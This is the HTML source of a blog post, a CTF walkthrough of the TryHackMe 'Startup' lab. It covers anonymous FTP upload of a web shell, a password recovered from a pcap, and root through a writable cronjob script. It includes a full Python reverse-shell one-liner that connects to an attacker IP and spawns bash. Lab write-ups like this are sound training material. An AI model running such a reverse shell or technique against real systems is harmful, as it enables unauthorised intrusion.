@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="light dark">
+
+    
+      <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdn.jsdelivr.net/; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;">
+
+    
+
+    <meta name="author" content="Neo Alderson">
+    <meta name="description" content=")
+Hello, this is Neo. Today we have a CTF Tryhackme - Startup. Let&rsquo;s go!!!
+Firstly, always, I will scan open port. I use rustscan because it faster than nmap, moreover it can integrates with nmap.
+I have 3 open port:
+ port 21 with ftp server and I can login by anonymous. port 22 are running ssh on ubuntu server port 80 with Apache httpd 2.4.18 on ubuntu server  In port 21, I have some insteresting here.">
+    <meta name="keywords" content="blog,developer,pentest,hacking,infosec,personal">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Tryhackme - Startup"/>
+<meta name="twitter:description" content=")
+Hello, this is Neo. Today we have a CTF Tryhackme - Startup. Let&rsquo;s go!!!
+Firstly, always, I will scan open port. I use rustscan because it faster than nmap, moreover it can integrates with nmap.
+I have 3 open port:
+ port 21 with ftp server and I can login by anonymous. port 22 are running ssh on ubuntu server port 80 with Apache httpd 2.4.18 on ubuntu server  In port 21, I have some insteresting here."/>
+
+    <meta property="og:title" content="Tryhackme - Startup" />
+<meta property="og:description" content=")
+Hello, this is Neo. Today we have a CTF Tryhackme - Startup. Let&rsquo;s go!!!
+Firstly, always, I will scan open port. I use rustscan because it faster than nmap, moreover it can integrates with nmap.
+I have 3 open port:
+ port 21 with ftp server and I can login by anonymous. port 22 are running ssh on ubuntu server port 80 with Apache httpd 2.4.18 on ubuntu server  In port 21, I have some insteresting here." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://re-toor.github.io/posts/thm-startup/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-09-30T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-09-30T00:00:00+00:00" />
+
+
+
+    <title>
+  Tryhackme - Startup · Re-toor
+</title>
+
+    
+      <link rel="canonical" href="https://re-toor.github.io/posts/thm-startup/">
+    
+
+    <link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.f3b7c0d4e0381e6dc91f3e94d21e2c9547f4e3e463cb86179330160f4fe79604.css" integrity="sha256-87fA1OA4Hm3JHz6U0h4slUf04&#43;Rjy4YXkzAWD0/nlgQ=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.002ee2378e14c7a68f1f0a53d9694ed252090987c4e768023fac694a4fc5f793.css" integrity="sha256-AC7iN44Ux6aPHwpT2WlO0lIJCYfE52gCP6xpSk/F95M=" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    <meta name="generator" content="Hugo 0.93.1" />
+  </head>
+
+  
+  
+    
+  
+  <body class="preload-transitions colorscheme-auto">
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      Re-toor
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Posts</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/">Categories</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/tags/">Tags</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="https://re-toor.github.io/vi/posts/thm-startup/">🇻🇳</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://re-toor.github.io/posts/thm-startup/">
+              Tryhackme - Startup
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime="2021-09-30T00:00:00Z">
+                September 30, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              3-minute read
+            </span>
+          </div>
+          
+          <div class="categories">
+  <i class="fa fa-folder" aria-hidden="true"></i>
+    <a href="/categories/ctf/">CTF</a>
+      <span class="separator">•</span>
+    <a href="/categories/tryhackme/">Tryhackme</a></div>
+
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/web/">web</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/linux/">linux</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/ftp/">ftp</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/ssh/">ssh</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/cronjob/">cronjob</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/wireshark/">wireshark</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <p><img src="/images/THM-Startup/intro.png?stayle=centerme" alt="intro">)</p>
+<p>Hello, this is Neo. Today we have a CTF <a href="https://tryhackme.com/room/startup">Tryhackme - Startup</a>. Let&rsquo;s go!!!</p>
+<p>Firstly, always, I will scan open port. I use rustscan because it faster than nmap, moreover it can integrates with nmap.</p>
+<p><img src="/images/THM-Startup/scan-port.png?stayle=centerme" alt="scan-port"></p>
+<p>I have 3 open port:</p>
+<ul>
+<li>port 21 with ftp server and I can login by anonymous.</li>
+<li>port 22 are running ssh on ubuntu server</li>
+<li>port 80 with Apache httpd 2.4.18 on ubuntu server</li>
+</ul>
+<p>In port 21, I have some insteresting here.</p>
+<p><img src="/images/THM-Startup/port21.png?stayle=centerme" alt="port21"></p>
+<p>In the ftp server I have a txt file and an image file, anonymous users also have the right to edit and write files. So I can upload files to ftp server, I&rsquo;m not sure. Check out the other 2 files.</p>
+<p><img src="/images/THM-Startup/notice.png?stayle=centerme" alt="notice"></p>
+<p>I have a name here: <strong>Maya</strong>. The other picture is nothing special. I will go back to the ftp server to put the shell on and see if it works.</p>
+<p><img src="/images/THM-Startup/put-shell.png?stayle=centerme" alt="put-shell"></p>
+<p>Oke. Now try to check the web path to see if you can find the url of the uploaded file.</p>
+<p><img src="/images/THM-Startup/dirsearch.png?stayle=centerme" alt="dirsearch"></p>
+<p>Go to path /files and I found ftp file server.</p>
+<p><img src="/images/THM-Startup/shell.png?stayle=centerme" alt="shell"></p>
+<p>Create listener with configured port inside shell and try to open file.</p>
+<p><img src="/images/THM-Startup/get-shell.png?stayle=centerme" alt="get-shell"></p>
+<p>Oh found it. Reconfigure the shell a bit with python to make it easier to exploit. In the web server file we have a recipe.txt file. Opened this file and I found <em>secret spicy soup recipe</em>.</p>
+<p>Go to <strong>/home</strong> directory and I have user <em>lennie</em>. However, no password is required. I try to check if there is any directory running www-data permission. And I found the <strong>incidents</strong> folder.</p>
+<p><img src="/images/THM-Startup/incidents.png?stayle=centerme" alt="incidents"></p>
+<p>In this there is a pcap file, clone it and try to check with Wireshark to see if you can find anything special, maybe there is Lennie&rsquo;s password. I create http server with python on remote machine and wget pcap file to my local machine, reply it to Wireshark only.</p>
+<p>After a long time of diving, I found the password of user lennie, in the file pcap.</p>
+<p><img src="/images/THM-Startup/lennie-pass.png?stayle=centerme" alt="lennie-password"></p>
+<p>Login and I have user flag.</p>
+<p><img src="/images/THM-Startup/user-flag.png?stayle=centerme" alt="user-flag"></p>
+<p>The next thing is privilege escalation. Along with the user flag I have 2 more folders and the <strong>scripts</strong> folder contains the executable. I will mine it first. File <strong>planner.sh</strong> will write a list title to the file <strong>startup_list.txt</strong> and then execute the file <strong>/etc/print.sh</strong>. I checked the <strong>print.sh</strong> file, it is running as user lennie, this means we can edit this file.</p>
+<p>I will add reverse shell to this file, but can&rsquo;t get root. Since this planner.sh file can be run, I will try to check if it is a cronjob running as root. And rightfully so.</p>
+<p>So the next thing is to edit this file to call the reverse shell. I will use this shell</p>
+<p><code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.8.**.**&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'</code></p>
+<p>Well, first create a listener.</p>
+<p><img src="/images/THM-Startup/reverse-shell.png?stayle=centerme" alt="reverse-shell"></p>
+<p><img src="/images/THM-Startup/rooted.png?stayle=centerme" alt="rooted"></p>
+<p>And I got it. Rooted!</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    ©
+    
+    2022
+     Neo Alderson 
+    ·
+    
+    Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+      
+      <script src="/js/coder.min.8fb86376a16e684af472a329aef502dbebcfab65ce264e9750d144912947c602.js" integrity="sha256-j7hjdqFuaEr0cqMprvUC2&#43;vPq2XOJk6XUNFEkSlHxgI="></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+  </body>
+
+</html>
